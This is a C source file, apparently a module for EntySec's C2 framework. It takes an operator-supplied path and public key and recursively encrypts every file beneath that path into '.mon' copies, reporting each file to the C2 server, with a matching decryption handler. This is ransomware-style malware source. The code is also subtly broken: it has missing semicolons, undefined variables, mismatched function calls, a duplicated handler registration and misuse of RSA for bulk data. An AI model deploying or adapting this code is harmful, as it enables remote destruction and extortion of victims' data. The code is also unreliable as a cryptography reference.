/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <limits.h>
#include <dirent.h>

#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/pem.h>

#include <tab.h>
#include <api.h>
#include <c2.h>
#include <tlv.h>
#include <tlv_types.h>
#include <console.h>

#define MONHORN_ENCRYPT \
        TLV_TYPE_CUSTOM(API_CALL_DYNAMIC, \
                        TAB_BASE, \
                        API_CALL)
#define MONHORN_DECRYPT \
        TLV_TYPE_CUSTOM(API_CALL_DYNAMIC, \
                        TAB_BASE, \
                        API_CALL + 1)

#define BUFFER_SIZE 4096
#define EVP_ENCRYPT 0
#define EVP_DECRYPT 1

static int evp_aes_decrypt(char *in_path, char *out_path, EVP_PKEY *pkey)
{
    FILE *in_file;
    FILE *out_file;

    EVP_CIPHER_CTX *ctx;
    EVP_PKEY_CTX *pkey_ctx;

    unsigned char in_buffer[1024 + EVP_MAX_BLOCK_LENGTH];
    unsigned char out_buffer[1024];

    size_t outlen;

    int total_len;
    int bytes_read;

    in_file = fopen(in_path, "rb");

    if (!in_file)
    {
        return -1;
    }

    out_file = fopen(out_path, "wb");

    if (!out_file)
    {
        fclose(in_file);
        return -1;
    }

    ctx = EVP_CIPHER_CTX_new();

    if (!ctx)
    {
        fclose(in_file);
        fclose(out_file);

        return -1;
    }

    total_len = 0;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);

    pkey_ctx = EVP_PKEY_CTX_new(pkey, NULL);
    EVP_PKEY_decrypt_init(pkey_ctx);
    EVP_PKEY_CTX_set_rsa_padding(pkey_ctx, RSA_PKCS1_PADDING);
    EVP_PKEY_CTX_set_rsa_oaep_md(pkey_ctx, EVP_sha256());

    while (1)
    {
        bytes_read = fread(in_buffer, 1, 1024 + EVP_MAX_BLOCK_LENGTH, in_file);

        if (bytes_read <= 0)
        {
            break;
        }

        if (EVP_PKEY_decrypt(pkey_ctx, out_buffer, &outlen, in_buffer, bytes_read) <= 0)
        {
            EVP_PKEY_CTX_free(pkey_ctx);
            EVP_CIPHER_CTX_free(ctx);

            fclose(in_file);
            fclose(out_file);

            return -1;
        }

        fwrite(out_buffer, 1, outlen, out_file);
        total_len += outlen;
    }

    EVP_PKEY_CTX_free(pkey_ctx);
    EVP_CIPHER_CTX_free(ctx);

    fclose(in_file);
    fclose(out_file);

    return total_len;
}

static int evp_aes_encrypt(char *in_path, char *out_path, EVP_PKEY *pkey)
{
    FILE *in_file;
    FILE *out_file;

    EVP_CIPHER_CTX *ctx;
    EVP_PKEY_CTX *pkey_ctx;

    unsigned char in_buffer[1024];
    unsigned char out_buffer[1024 + EVP_MAX_BLOCK_LENGTH];

    size_t outlen;

    int total_len;
    int bytes_read;

    in_file = fopen(in_path, "rb");

    if (!in_file)
    {
        return -1;
    }

    out_file = fopen(out_path, "wb");

    if (!out_file)
    {
        fclose(in_file);
        return -1;
    }

    ctx = EVP_CIPHER_CTX_new();

    if (!ctx)
    {
        fclose(in_file);
        fclose(out_file);

        return -1;
    }

    total_len = 0

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);

    pkey_ctx = EVP_PKEY_CTX_new(pkey, NULL);
    EVP_PKEY_encrypt_init(pkey_ctx);
    EVP_PKEY_CTX_set_rsa_padding(pkey_ctx, RSA_PKCS1_PADDING);
    EVP_PKEY_CTX_set_rsa_oaep_md(pkey_ctx, EVP_sha256());

    while (1)
    {
        bytes_read = fread(in_buffer, 1, 1024, in_file);

        if (bytes_read <= 0)
        {
            break;
        }

        if (EVP_PKEY_encrypt(pkey_ctx, out_buffer, &outlen, in_buffer, bytes_read) <= 0)
        {
            EVP_PKEY_CTX_free(pkey_ctx);
            EVP_CIPHER_CTX_free(ctx);

            fclose(in_file);
            fclose(out_file);

            return -1;
        }

        fwrite(out_buffer, 1, outlen, out_file);
        total_len += outlen;
    }

    EVP_PKEY_CTX_free(pkey_ctx);
    EVP_CIPHER_CTX_free(ctx);

    fclose(in_file);
    fclose(out_file);

    return total_len;
}

int evp_aes_walk(c2_t *c2, char *path, EVP_PKEY *pkey, int flag)
{
    DIR *dir;
    struct dirent *entry;

    char file_path[PATH_MAX];
    char message[PATH_MAX + 16];
    char new_file[PATH_MAX];

    tlv_pkt_t *tlv_pkt;

    dir = opendir(path);

    if (!dir)
    {
        return -1;
    }

    while ((entry = readdir(dir)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
        {
            continue;
        }

        memset(file_path, '\0', PATH_MAX);

        if (strcmp(path, "/") == 0)
        {
            snprintf(file_path, sizeof(file_path), "/%s", entry->d_name);
        }
        else
        {
            snprintf(file_path, sizeof(file_path), "%s/%s", path, entry->d_name);
        }

        memset(message, '\0', PATH_MAX);

        if (flag == EVP_ENCRYPT)
        {
            snprintf(message, sizeof(message), "Encrypting %s\n", file_path);
        }
        else if (flag == EVP_DECRYPT)
        {
            snprintf(message, sizeof(message), "Decrypting %s\n", file_path);
        }

        tlv_pkt = api_craft_tlv_pkt(API_CALL_WAIT);
        tlv_pkt_add_string(tlv_pkt, TLV_TYPE_STRING, message);
        c2_write(c2, tlv_pkt);
        tlv_pkt_destroy(tlv_pkt);

        if (entry->d_type == DT_REG)
        {
            memset(new_file, '\0', PATH_MAX);

            if (flag == EVP_ENCRYPT)
            {
                snprintf(new_file, sizeof(new_file), "%s.mon", file_path);
                evp_aes_encrypt(file_path, new_file, pkey);
            }
            else if (flag == EVP_DECRYPT)
            {
                snprintf(new_file, sizeof(new_file), "%s.dec", file_path);
                evp_aes_decrypt(file_path, new_file, pkey);
            }
        }
        else if (entry->d_type == DT_DIR)
        {
            evp_aes_recursive(file_path, pkey, flag);
        }
    }

    closedir(dir);
    return 0;
}

int evp_aes_recursive(char *path, EVP_PKEY *pkey, int flag)
{
    DIR *dir;
    struct dirent *entry;

    char file_path[PATH_MAX];
    char new_file[PATH_MAX];

    dir = opendir(path);

    if (!dir)
    {
        return -1;
    }

    while ((entry = readdir(dir)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
        {
            continue;
        }

        memset(file_path, '\0', PATH_MAX);
        snprintf(file_path, sizeof(file_path), "%s/%s", path, entry->d_name);

        if (entry->d_type == DT_REG)
        {
            memset(new_file, '\0', PATH_MAX);

            if (flag == EVP_ENCRYPT)
            {
                snprintf(new_file, sizeof(new_file), "%s.mon", file_path);
                evp_aes_encrypt(file_path, new_file, pkey);
            }
            else if (flag == EVP_DECRYPT)
            {
                snprintf(new_file, sizeof(new_file), "%s.dec", file_path);
                evp_aes_decrypt(file_path, new_file, pkey);
            }
        }
        else if (entry->d_type == DT_DIR)
        {
            evp_aes_recursive(tlv_packet, file_path, pkey, flag);
        }
    }

    closedir(dir);
    return 0;
}

static tlv_pkt_t *monhorn_decrypt(c2_t *c2)
{
    int pkey_length;
    int status

    unsigned char *pkey_data;
    char *filename;

    pkey_length = tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_BYTES, &pkey_data);

    BIO *bufio = BIO_new_mem_buf((void *)pkey_data, pkey_length);
    EVP_PKEY *pkey = PEM_read_bio_PrivateKey(bufio, NULL, NULL, NULL);

    tlv_pkt_get_string(c2->tlv_pkt, TLV_TYPE_STRING, &filename);

    status = API_CALL_SUCCESS;

    if (evp_aes_walk(c2, filename, pkey, EVP_DECRYPT) < 0)
    {
        status = API_CALL_FAIL;
    }

    EVP_PKEY_free(pkey);
    return api_craft_tlv_pkt(status);
}

static tlv_pkt_t *monhorn_encrypt(tlv_pkt_t *tlv_packet)
{
    int pkey_length;
    int status;

    unsigned char *pkey_data;
    char *filename;

    pkey_length = tlv_pkt_get_bytes(c2->tlv_pkt, TLV_TYPE_BYTES, &pkey_data);

    BIO *bufio = BIO_new_mem_buf((void *)pkey_data, pkey_length);
    EVP_PKEY *pkey = PEM_read_bio_PUBKEY(bufio, NULL, NULL, NULL);

    tlv_pkt_get_string(c2->tlv_pkt, TLV_TYPE_STRING, &filename);

    status = API_CALL_SUCCESS;

    if (evp_aes_walk(c2, filename, pkey, EVP_ENCRYPT) < 0)
    {
        status = API_CALL_FAIL;
    }

    EVP_PKEY_free(pkey);
    return api_craft_tlv_pkt(status);
}

int main(void)
{
    c2_t *c2;

    if ((c2 = c2_create(0, STDIN_FILENO, NULL)) != NULL)
    {
        api_call_register(&c2->dynamic.api_calls, MONHORN_ENCRYPT, monhorn_encrypt);
        api_call_register(&c2->dynamic.api_calls, MONHORN_ENCRYPT, monhorn_decrypt);

        tab_console_loop(c2);
        c2_destroy(c2, FD_CLOSE);

        return 0;
    }

    return 1;
}
